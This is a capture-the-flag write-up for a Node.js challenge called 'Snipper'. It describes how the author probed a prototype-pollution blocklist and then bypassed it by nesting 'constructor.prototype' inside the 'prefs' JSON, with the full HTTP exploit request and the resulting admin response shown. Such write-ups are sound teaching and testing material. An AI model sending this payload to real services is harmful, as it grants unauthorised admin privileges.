# Snipper

**Category:** PWN 
**Platform:** Netanix / NxCTF  
**Flag:** `NxCTF{REDACTED}`

---

## Overview

A Node.js web service performs a deep-merge of user-supplied JSON into a config object. The server has a blocklist that tries to prevent prototype pollution, but it only checks `constructor`/`prototype` at the **top level** of the object — allowing a nested bypass via `constructor.prototype`.

---

## Solution

### Step 1 — Recon the service

```http
GET /
```
Returns a service description/writeup.

```http
POST /api/run
{"prefs":{}}
```
Returns:
```json
{"admin": false, "config": {"theme": "dark", "lang": "en"}}
```

The goal is to make `admin` return `true`.

### Step 2 — Probe the blocklist

Test various prototype pollution payloads to understand what is filtered:

| Payload | Result |
|--------|--------|
| `{"__proto__": {...}}` | Blocked — `__proto__` key detected at any depth |
| `{"constructor": {"prototype": ...}}` | Blocked — `constructor`/`prototype` checked at top level |
| `{"a": {"__proto__": {...}}}` | Blocked — `__proto__` check is depth-insensitive |
| `{"isAdmin": true}` | Not blocked, but only sets a local config key (admin check fails) |

### Step 3 — Form the bypass hypothesis

The `__proto__` check appears depth-insensitive, but the `constructor`/`prototype` check is **top-level only**.

Test nesting `constructor.prototype` one level deeper:

```json
{"prefs": {"a": {"constructor": {"prototype": {"isAdmin": true}}}}}
```

### Step 4 — Send the exploit

```http
POST /api/run
Content-Type: application/json

{
  "prefs": {
    "a": {
      "constructor": {
        "prototype": {
          "isAdmin": true
        }
      }
    }
  }
}
```

### Step 5 — Receive the flag

Server response:
```json
{
  "admin": true,
  "flag": "NxCTF{REDACTED}"
}
```

---

## How It Works

JavaScript's deep-merge functions recursively copy properties from source to destination. When `constructor.prototype` is encountered during the merge, the merge library writes `isAdmin: true` onto `Object.prototype` itself. Since every object in JavaScript inherits from `Object.prototype`, the admin check (`obj.isAdmin`) returns `true` for all subsequent objects — including the one used to gate flag access.

**Why the blocklist failed:** It only checked if the *top-level key* of `prefs` was `constructor` or `prototype`. By nesting the payload one object level deeper (`prefs.a.constructor.prototype`), we bypassed the check entirely.

---

## Flag

```
NxCTF{REDACTED}
```
